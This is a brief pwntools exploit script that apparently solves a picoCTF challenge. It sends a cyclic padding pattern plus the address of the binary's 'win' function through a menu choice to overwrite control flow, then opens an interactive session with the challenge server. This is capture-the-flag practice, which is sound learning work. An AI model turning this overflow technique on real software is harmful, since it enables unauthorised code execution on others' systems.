import pwn

LOCAL = 0
HOST = "mimas.picoctf.net"
PORT = 64879

# os.system("ulimit -c ulimited")

elf = pwn.ELF("./chall")

if LOCAL:
    p = elf.process()
else:
    p = pwn.remote(HOST, PORT)

payload = pwn.cyclic(32) + pwn.p32(elf.symbols["win"])
p.sendlineafter(b"choice: ", b"2")
p.sendline(payload)

p.sendlineafter(b"choice: ", b"4")
p.interactive()
